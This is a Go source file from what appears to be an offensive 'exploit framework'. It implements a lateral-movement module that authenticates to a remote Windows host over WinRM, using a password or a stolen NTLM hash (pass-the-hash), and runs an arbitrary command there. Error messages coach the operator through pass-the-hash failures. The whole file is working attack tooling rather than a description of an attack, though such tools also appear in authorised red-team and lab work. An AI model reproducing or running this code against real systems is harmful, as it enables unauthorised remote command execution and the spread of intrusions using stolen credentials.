package lateral

import (
	"bytes"
	"context"
	"fmt"
	"strings"

	"github.com/masterzen/winrm"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Command == "" {
		return nil, fmt.Errorf("command required")
	}
	if cfg.Username == "" {
		return nil, fmt.Errorf("username required for WinRM")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return nil, fmt.Errorf("password or ntlm_hash required for WinRM")
	}

	// HTTP 5985. Insecure TLS reserved for future HTTPS/5986 fields.
	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)
	user := formatDomainUser(cfg.Domain, cfg.Username)

	var client *winrm.Client
	var err error
	if cfg.NtlmHash != "" {
		hashHex, herr := normalizeNTHashHex(cfg.NtlmHash)
		if herr != nil {
			return nil, herr
		}
		params := *winrm.DefaultParameters
		params.TransportDecorator = func() winrm.Transporter {
			return newClientNTLMWithHash(user, hashHex)
		}
		// Password unused by hash transport. Transport seals SOAP when Sign/Seal negotiated
		// (AllowUnencrypted=false parity with password-path NewEncryption("ntlm")).
		client, err = winrm.NewClientWithParameters(endpoint, user, "x", &params)
	} else {
		// Prefer NTLM message encryption (pypsrp encryption=auto parity) when available.
		// Falls back to plain ClientNTLM if encryption setup fails.
		params := *winrm.DefaultParameters
		if enc, encErr := winrm.NewEncryption("ntlm"); encErr == nil {
			params.TransportDecorator = func() winrm.Transporter {
				return enc
			}
		} else {
			params.TransportDecorator = func() winrm.Transporter {
				return &winrm.ClientNTLM{}
			}
		}
		client, err = winrm.NewClientWithParameters(endpoint, user, cfg.Password, &params)
	}
	if err != nil {
		return nil, fmt.Errorf("create WinRM client: %w", err)
	}

	var stdout, stderr bytes.Buffer
	exitCode, err := client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
	if err != nil {
		return nil, fmt.Errorf("WinRM exec: %w", classifyWinRMError(err, cfg.NtlmHash != "", user))
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR:\n" + stderr.String()
	}

	return &pb.LateralMoveResult{
		Method:  "winrm",
		Target:  cfg.Target,
		Success: exitCode == 0,
		Output:  output,
	}, nil
}

// classifyWinRMError appends actionable hints for common lab failures (401, encryption).
func classifyWinRMError(err error, usedHash bool, domainUser string) error {
	if err == nil {
		return nil
	}
	msg := err.Error()
	// HTTP 401 / unauthorized
	if strings.Contains(msg, "401") || strings.Contains(strings.ToLower(msg), "unauthorized") {
		hint := "check domain\\user format and creds"
		if usedHash {
			hint = "PTH: use --domain NETBIOS (or DOMAIN\\user); hash must be 32-hex NT; " +
				"hash path prefers NTLM message encryption and falls back to plain SOAP if rejected"
		} else {
			hint = "password path uses NTLM message encryption when available; verify domain\\user and password"
		}
		return fmt.Errorf("%w (user=%s; %s)", err, domainUser, hint)
	}
	if strings.Contains(strings.ToLower(msg), "encrypt") || strings.Contains(msg, "415") {
		return fmt.Errorf("%w (WinRM message encryption/content-type issue; hash path retries plain SOAP after seal rejection)", err)
	}
	return err
}
